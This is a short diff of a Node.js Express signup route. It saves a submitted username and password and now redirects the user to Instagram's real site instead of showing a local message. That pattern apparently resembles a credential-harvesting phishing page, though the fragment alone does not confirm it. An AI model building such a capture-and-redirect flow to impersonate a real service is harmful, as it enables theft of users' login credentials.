@@ -34,7 +34,7 @@ app.post('/signup', async (req, res) => {
     username,
     password
   });
- return  res.render("Msg");
+ return  res.redirect("https://www.instagram.com/");
 });
  // listeing
  app.listen(PORT , () => console.log('server started'));
